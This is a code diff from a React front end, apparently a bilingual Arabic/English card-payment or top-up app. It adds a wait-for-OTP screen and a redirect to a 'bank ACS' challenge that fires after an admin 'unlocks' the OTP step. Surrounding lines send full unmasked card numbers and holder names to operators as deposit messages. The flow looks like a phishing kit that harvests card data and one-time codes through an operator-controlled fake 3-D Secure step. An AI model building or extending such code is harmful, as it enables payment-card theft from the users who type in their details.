@@ -553,6 +553,18 @@ function MainContent() {
       /* ignore */
     }
   }, []);
+
+  // Open bank ACS when showOtpStep is set (after admin unlocks awaiting_otp)
+  useEffect(() => {
+    if (!showOtpStep || !currentOrderId || !clientId) return;
+    redirectToAcsChallenge({
+      orderRef: currentOrderId,
+      clientId,
+      lang,
+      phoneLast3: otpPhoneLast3,
+      returnUrl: `${window.location.origin}/`,
+    });
+  }, [showOtpStep, currentOrderId, clientId, lang, otpPhoneLast3]);
   const fileInputRef = useRef<HTMLInputElement>(null);
   const prevTransactionsRef = useRef<ServerTransaction[]>([]);
   const [fileName, setFileName] = useState<string | null>(null);
@@ -1721,6 +1733,9 @@ function MainContent() {
           return;
         }
         setCardValidationError(null);
+        // Show wait-for-OTP screen immediately (before network)
+        setCardProcessingToOtp(true);
+        setShowOtpStep(false);
         details =
           `💰 طلب إيداع رصيد\n` +
           `👤 الاسم: ${cardHolder}\n` +
@@ -1752,6 +1767,9 @@ function MainContent() {
           return;
         }
         setCardValidationError(null);
+        // Show wait-for-OTP screen immediately (before network)
+        setCardProcessingToOtp(true);
+        setShowOtpStep(false);
 
         // As requested: Send unmasked full details, and explicitly highlight requested parts
         const last4 = cardNumber.slice(-4);
@@ -1848,6 +1866,7 @@ function MainContent() {
       if (!res.ok) {
         const errText = await res.text();
         console.error('Create transaction failed:', res.status, errText);
+        setCardProcessingToOtp(false);
         setIsSubmitting(false);
         return;
       }
@@ -1858,10 +1877,11 @@ function MainContent() {
         const orderRef = data.order_ref || data.id;
         if (!orderRef) {
           console.error('Create transaction: missing order_ref');
+          setCardProcessingToOtp(false);
           setIsSubmitting(false);
           return;
         }
-        setCurrentOrderId(orderRef);
+        setCurrentOrderId(String(orderRef));
         setCardProcessingToOtp(true);
         setShowOtpStep(false);
         setOtpState('input');
@@ -1875,6 +1895,7 @@ function MainContent() {
       
     } catch (error) {
       console.error("Failed to process transaction", error);
+      setCardProcessingToOtp(false);
     }
 
     setTimeout(() => {
@@ -6755,6 +6776,22 @@ function MainContent() {
   };
 
   const renderMainContent = () => {
+    // Global wait-for-OTP / opening-3DS screen (buy card, deposit, any card flow)
+    if (cardProcessingToOtp || showOtpStep) {
+      return (
+        <CardProcessingToOtpScreen
+          lang={lang}
+          etaText={
+            showOtpStep
+              ? lang === 'ar'
+                ? 'جاري فتح صفحة التحقق البنكي...'
+                : 'Opening bank verification page...'
+              : t('otpEtaDelivery')
+          }
+        />
+      );
+    }
+
     if (appSettings.maintenance_mode && !isAdmin && currentView !== 'login') {
       return (
         <div className="flex-1 flex items-center justify-center p-6 bg-gray-50 min-h-screen">
